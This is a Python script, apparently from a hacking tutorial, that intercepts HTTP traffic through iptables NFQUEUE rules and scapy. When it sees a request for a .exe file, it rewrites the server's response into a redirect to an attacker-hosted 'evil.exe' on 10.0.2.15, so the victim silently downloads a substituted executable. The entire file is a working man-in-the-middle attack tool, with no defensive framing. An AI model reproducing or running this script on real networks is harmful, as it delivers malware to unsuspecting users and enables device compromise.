#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import subprocess
import argparse

ack_list = []

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c0", "--chain0", dest="chain_name0", help="Chain name: FORWARD, OUTPUT, INPUT etc.")
    parser.add_argument("-c1", "--chain1", dest="chain_name1", help="Chain name: FORWARD, OUTPUT, INPUT etc.")
    parser.add_argument("-qn", "--queue-num", dest="queue_num", help="Queue number: 0, 1, 3 etc.")
    options = parser.parse_args()
    if not options.chain_name0:
        parser.error("Please, specify a chain name, use --help for more info")
    elif not options.queue_num:
        parser.error("Please, specify a queue number, use --help for more info")
    else:
        if ("OUTPUT" or "INPUT") == options.chain_name0:
            if not options.chain_name1:
                parser.error("Please, specify a chain name, use --help for more info")
    return options

def presets_for_intercept_and_modify_packets(options):
    if options.chain_name1:
        subprocess.call(["iptables", "-I", options.chain_name1, "-j", "NFQUEUE", "--queue-num", options.queue_num])
    subprocess.call(["iptables", "-I", options.chain_name0, "-j", "NFQUEUE", "--queue-num", options.queue_num])

def flush_presets():
    subprocess.call("iptables --flush", shell=True)

def set_load_link(packet, load_link):
    packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\r\nLocation: " + load_link + "\r\n\r\n"
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("Replacing file")
                modified_packet = set_load_link(scapy_packet, "http://10.0.2.15/files/evil.exe")
                packet.set_payload(str(modified_packet))

    packet.accept()

options = get_args()
presets_for_intercept_and_modify_packets(options)
try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(int(options.queue_num), process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\nDetecting 'CTRL+C'... Flushing IP-tables... Please wait...")
    flush_presets()
    print("IP-tables were flushing successfully!")